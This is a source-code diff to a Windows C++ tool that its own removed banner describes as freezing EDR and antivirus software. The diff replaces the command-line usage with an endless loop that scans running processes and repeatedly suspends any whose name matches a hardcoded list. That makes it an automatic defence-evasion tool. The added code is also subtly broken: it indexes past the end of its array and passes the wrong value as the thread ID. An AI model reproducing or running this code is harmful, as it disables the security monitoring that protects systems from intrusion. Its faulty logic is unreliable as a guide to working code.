@@ -2,6 +2,7 @@
 #include <iostream>
 #include "ProcessMisc.h"
 #include "PPLHelp.h"
+#include <tlhelp32.h>
 
 struct PauseCheckParams {
     DWORD targetPID;
@@ -112,37 +113,59 @@ BOOL FreezeRun(DWORD targetPID, DWORD targetTID, DWORD sleepTime)
     return 1;
 }
 
-
 int wmain(int argc, wchar_t* argv[])
 {
-    std::wcout << L"\nEDR-Freeze: Tool that freezes EDR/Antivirus\n"
-        << L"  Two Seven One Three: https://x.com/TwoSevenOneT\n"
-        << L"==================================================\n\n";
-
-    if (argc != 3)
-    {
-        std::wcout << L"Usage:\n"
-            << L"  EDR-Freeze.exe <TargetPID> <SleepTime>\n\n"
-            << L"Example:\n"
-            << L"  EDR-Freeze.exe 1234 10000\n"
-            << L"  Freeze the target for 10000 milliseconds\n";
-        return 0;
-    }
-    DWORD targetPid = _wtoi(argv[1]);
-    DWORD pauseTime = _wtoi(argv[2]);
+	// initalize
     if (!EnableDebugPrivilege())
     {
         std::wcerr << L"Failed to enable debug privilege.\n";
         return 0;
     }
-    // Get main thread ID
-    DWORD targetTid = GetMainThreadId(targetPid);
-    if (targetTid == 0)
-    {
-        std::wcerr << L"Failed to find main thread for PID " << targetPid << L"\n";
-        return 0;
-    }
-    FreezeRun(targetPid, targetTid, pauseTime);
+
+    const wchar_t* vp[] = {
+    L"test_000.exe", L"test_001.exe", L"test_002.exe", L"test_003.exe",
+    L"test_004.exe", L"test_005.exe", L"test_006.exe", L"test_007.exe",
+    L"test_008.exe", L"test_009.exe", L"test_010.exe", L"test_011.exe",
+    L"test_012.exe", L"test_013.exe", L"test_014.exe", L"test_015.exe",
+    L"test_016.exe", L"test_017.exe", L"test_018.exe", L"test_019.exe"
+    };
+
+    DWORD th32ProcessID = 0, targetPID = 0;
+    HANDLE Toolhelp32Snapshot, tmpSnapshot;
+    PROCESSENTRY32 pe;
+    do {
+        Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
+        if (Toolhelp32Snapshot != INVALID_HANDLE_VALUE)
+        {
+            tmpSnapshot = Toolhelp32Snapshot;
+            if (Process32First(Toolhelp32Snapshot, &pe))
+            {
+                do {
+                    targetPID = pe.th32ProcessID;
+                    for (int i = 0; i < 21; i++) {
+
+                        if (_wcsicmp(pe.szExeFile, vp[i]) == 0) {
+                            targetPID = pe.th32ProcessID;
+							DWORD targetTid = GetMainThreadId(targetPID);
+                            if (targetTid == 0)
+                            {
+                                std::wcerr << L"Failed to find main thread for PID " << targetPID << L"\n";
+                                return 0;
+                            }
+                            FreezeRun(targetPID, GetMainThreadId(targetTid), 10000);
+                        }
+                    }
+                } while (Process32Next(tmpSnapshot, &pe));
+                CloseHandle(tmpSnapshot);
+            }
+        }
+        else {
+            std::wcerr << L"\nCreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
+        }
+
+
+    } while (true);
+
 
     return 0;
 }
